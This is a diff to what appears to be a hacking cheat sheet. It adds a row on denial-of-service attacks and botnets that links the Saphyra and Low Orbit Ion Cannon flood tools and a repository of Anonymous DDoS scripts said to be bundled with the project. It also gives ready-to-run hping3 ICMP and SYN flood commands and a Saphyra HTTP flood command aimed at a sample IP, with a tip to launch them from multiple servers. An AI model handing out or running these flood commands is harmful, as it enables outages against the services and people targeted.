@@ -404,10 +404,20 @@ $ steghide extract -sf image.jpg <br />
 
 <tr>
 <th>DDoS from dark web</th>
-<td>Distributed Denial of service<br /></td>
+<td>Distributed Denial of service & botnet<br /></td>
 <td>
 
+[tor browser](https://www.torproject.org/download/) <br />
+[saphyra](https://securityintelligence.com/dissecting-hacktivists-ddos-tool-saphyra-revealed/) : http flood attack : HTTP get<br />
+[low orbit ion cannon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon)<br />
+All the DDoS scripts from [H1R0GH057/Anonymous](https://github.com/H1R0GH057/Anonymous) are also in scripts/security/[ddos](./scripts/security/ddos/)<br />
 
+$ sudo hping3 -1 --flood 10.7.1.50 (ping as dos)<br />
+
+ICMP Flood / ping of death : but ICMP or ping response can be disabled.<br />
+
+$ sudo hping3 -d 200 -p 80 -S --flood 10.7.1.50 (from multiple servers)<br />
+$ python saphyra.py http://10.7.1.50 <br />
 <br /></td>
 </tr>
 
